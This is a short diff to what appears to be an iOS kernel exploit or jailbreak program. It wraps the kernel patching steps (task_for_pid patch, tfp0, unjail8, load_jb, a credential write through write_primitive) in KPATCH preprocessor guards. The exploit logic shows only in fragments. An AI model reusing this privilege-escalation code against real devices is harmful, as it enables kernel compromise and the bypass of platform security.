@@ -726,7 +726,7 @@ void do_exploit(uint32_t kernel_base)
         LOG("I am god?: %x", getuid());
     }
     
-    
+#ifdef KPATCH
     /* task_for_pid */
     uint32_t task_for_pid_base = koffset(offsetof_task_for_pid) + kernel_base;
     uint32_t pid_check_addr = koffset(offsetof_pid_check) + task_for_pid_base;
@@ -769,7 +769,7 @@ void do_exploit(uint32_t kernel_base)
         exec_primitive(flush_dcache, 0, 0);
         usleep(100000);
     }
-    
+#endif /* KPATCH */
 }
 
 void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize)
@@ -1107,6 +1107,7 @@ int main(void)
     
     do_exploit(kernel_base);
     
+#ifdef KPATCH
     if(tfp0)
     {
         LOG("got tfp0: %x", tfp0);
@@ -1114,7 +1115,7 @@ int main(void)
         unjail8(kernel_base);
 #ifdef UNTETHER
         load_jb();
-#endif
+#endif /* UNTETHER */
         
     }
     else
@@ -1131,6 +1132,7 @@ int main(void)
         write_primitive(myproc + koffset(offsetof_p_ucred), mycred);
         setuid(501);
     }
+#endif /* KPATCH */
     
     return 0;
 }
